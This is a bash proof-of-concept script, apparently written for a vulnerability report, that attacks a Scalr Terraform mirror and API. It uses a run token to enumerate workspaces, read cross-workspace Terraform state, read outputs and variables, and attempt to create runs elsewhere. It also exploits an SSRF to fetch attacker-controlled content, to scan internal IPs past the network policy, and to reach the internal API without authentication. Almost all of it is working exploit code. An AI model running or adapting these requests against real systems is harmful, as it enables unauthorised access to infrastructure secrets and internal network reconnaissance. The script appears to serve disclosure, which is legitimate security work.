#!/usr/bin/env bash
# HARM DEMONSTRATION: C4 SSRF + SCALR_TOKEN scope
# All tests read-only except [6] which only reads run permissions.

MIRROR="https://internal.main.scalr.dev/terraform-mirror"
ACCOUNT_ID="acc-v0p14gmusfk03k3e0"

# Helpers
ssrf_head() {
    curl -sk --max-time 8 --no-location --path-as-is -D - \
      "$MIRROR/$1" 2>/dev/null | grep -E "^HTTP/|^[Ll]ocation:" | head -2
}
ssrf_follow() {
    # Follow redirect - simulates Terraform client downloading a provider
    curl -sk --max-time 10 --path-as-is "$MIRROR/$1" 2>/dev/null | head -c 400
}
api() {
    # Returns body\nHTTP_STATUS
    curl -sk --max-time 5 -w "\n%{http_code}" \
      "https://$SCALR_HOSTNAME/api/iacp/v3/$1" \
      -H "Authorization: Bearer $SCALR_TOKEN"
}
parse() {
    python3 -c "
import sys,json
txt=sys.stdin.read()
parts=txt.rsplit('\n',1)
try:
    d=json.loads(parts[0]); status=parts[1] if len(parts)>1 else '?'
    print('HTTP', status)
    $1
except Exception as e:
    print('parse err:', e, '| raw:', txt[:200])
" 2>&1
}

# ─────────────────────────────────────────────────────────────────────────────
echo "=== [1] SCALR_TOKEN: workspace enumeration across env ==="
api "workspaces?page%5Bsize%5D=20" | parse "
wss=d.get('data',[])
print(len(wss),'workspaces visible (should be 1 — the current run workspace):')
for w in wss: print(' -',w['id'],w['attributes'].get('name','?'))
"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [2] SCALR_TOKEN: current workspace TF state (may contain secrets) ==="
api "workspaces/$SCALR_WORKSPACE_ID/current-state-version" | parse "
if 'data' in d:
    a=d['data'].get('attributes',{})
    print('STATE ACCESSIBLE — terraform:', a.get('terraform-version'), '| resources:', a.get('resources-processed'))
    dl=a.get('download-url','')
    print('download-url (signed):', dl[:100] if dl else 'none')
else:
    print('denied —', (d.get('errors') or [{}])[0].get('title','?'))
"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [3] SCALR_TOKEN: cross-workspace TF state (ws-v0p4n0bbq2e78ldn5 'fgfg') ==="
api "workspaces/ws-v0p4n0bbq2e78ldn5/current-state-version" | parse "
if 'data' in d:
    a=d['data'].get('attributes',{})
    print('CROSS-WORKSPACE STATE READABLE — resources:', a.get('resources-processed'))
    dl=a.get('download-url','')
    print('download-url (signed):', dl[:100] if dl else 'none')
else:
    print('denied —', (d.get('errors') or [{}])[0].get('title','?'))
"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [4] SCALR_TOKEN: workspace outputs (may expose sensitive values) ==="
api "workspace-outputs?filter%5Bworkspace%5D=$SCALR_WORKSPACE_ID&page%5Bsize%5D=20" | parse "
vs=d.get('data',[])
print(len(vs),'outputs:')
for v in vs:
    a=v['attributes']
    val='[hidden]' if a.get('sensitive') else str(a.get('value',''))[:60]
    print(' -',a.get('name'),'sensitive='+str(a.get('sensitive')),'val='+val)
print('(if outputs exist they appear above)' if not vs else '')
"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [5] SCALR_TOKEN: environment-level variables ==="
api "vars?filter%5Benvironment%5D=$SCALR_ENVIRONMENT_ID&page%5Bsize%5D=50" | parse "
vs=d.get('data',[])
print(len(vs),'env vars:')
for v in vs:
    a=v['attributes']
    val='[SENSITIVE — value hidden]' if a.get('sensitive') else str(a.get('value',''))[:60]
    print(' -',a.get('key'),'cat='+str(a.get('category')),'sensitive='+str(a.get('sensitive')),'val='+val)
"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [6] SCALR_TOKEN: account-level variables ==="
api "vars?filter%5Baccount%5D=$ACCOUNT_ID&page%5Bsize%5D=50" | parse "
vs=d.get('data',[])
print(len(vs),'account vars:')
for v in vs:
    a=v['attributes']
    val='[SENSITIVE — value hidden]' if a.get('sensitive') else str(a.get('value',''))[:60]
    print(' -',a.get('key'),'cat='+str(a.get('category')),'sensitive='+str(a.get('sensitive')),'val='+val)
"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [7] SCALR_TOKEN: can it CREATE a run in another workspace? ==="
# Dry-check only: send empty body and observe if 422 (valid token/perm) or 403 (denied)
RESP=$(curl -sk --max-time 5 -w "\n%{http_code}" -X POST \
  "https://$SCALR_HOSTNAME/api/iacp/v3/runs" \
  -H "Authorization: Bearer $SCALR_TOKEN" \
  -H "Content-Type: application/vnd.api+json" \
  -d '{"data":{"type":"runs","relationships":{"workspace":{"data":{"type":"workspaces","id":"ws-v0p4n0bbq2e78ldn5"}}}}}')
STATUS=$(echo "$RESP" | tail -1)
echo "HTTP $STATUS (403=denied, 422=token accepted/validation failed, 201=RUN CREATED)"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [8] SSRF HARM: redirect followed → attacker content served ==="
echo "This simulates: Terraform downloads a provider binary FROM attacker server"
echo "The API server requests httpbin.org on our behalf, then redirects; curl follows:"
echo ""
ssrf_follow "https%3A%2F%2Fhttpbin.org%2Fjson"
echo ""
echo "(Above content came from httpbin.org — not from legitimate GCS provider mirror)"

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [9] SSRF: internal network scan via API-server as proxy ==="
echo "Pod NetworkPolicy blocks direct access. Via SSRF the API server probes:"
for target in \
    "http%3A%2F%2F127.0.0.1%2F" \
    "http%3A%2F%2F127.0.0.1%3A8080%2F" \
    "http%3A%2F%2F10.30.0.120%2F" \
    "http%3A%2F%2F10.30.0.102%2F" \
    "http%3A%2F%2F10.30.0.104%2F" \
    "http%3A%2F%2F10.30.0.2%2F"; do
    decoded=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('$target'))" 2>/dev/null)
    result=$(ssrf_head "$target")
    echo "  $decoded  →  ${result:-BLOCKED/timeout}"
done

# ─────────────────────────────────────────────────────────────────────────────
echo ""
echo "=== [10] SSRF: reach internal Scalr API as localhost (auth bypass attempt) ==="
echo "Flask runs on API server — can it reach its own API without auth?"
for path in \
    "http%3A%2F%2F127.0.0.1%2Fapi%2Fiacp%2Fv3%2Faccounts" \
    "http%3A%2F%2F127.0.0.1%2Fapi%2Fiacp%2Fv3%2Fworkspaces"; do
    decoded=$(python3 -c "import urllib.parse; print(urllib.parse.unquote('$path'))" 2>/dev/null)
    result=$(ssrf_head "$path")
    echo "  $decoded  →  ${result:-timeout}"
done

echo ""
echo "=== done ==="
